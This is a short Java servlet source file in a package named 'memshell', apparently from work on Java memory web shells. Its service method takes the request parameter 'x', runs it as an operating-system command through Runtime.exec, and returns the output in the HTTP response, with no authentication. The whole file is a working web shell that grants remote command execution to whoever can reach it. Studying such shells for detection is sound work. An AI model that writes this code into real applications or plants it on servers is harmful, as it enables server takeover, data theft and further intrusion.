package memshell.Servlet;

import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class TestServlet implements Servlet {

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
        System.out.println("init");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        System.out.println("servlet");

        if(servletRequest.getParameter("x") != null){
            Process process = Runtime.getRuntime().exec(servletRequest.getParameter("x"));
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String str = "";
            String line;
            while((line = reader.readLine()) != null) {
                str += line;
            }
            servletResponse.getOutputStream().write(str.getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {
        System.out.println("destroy");
    }
}
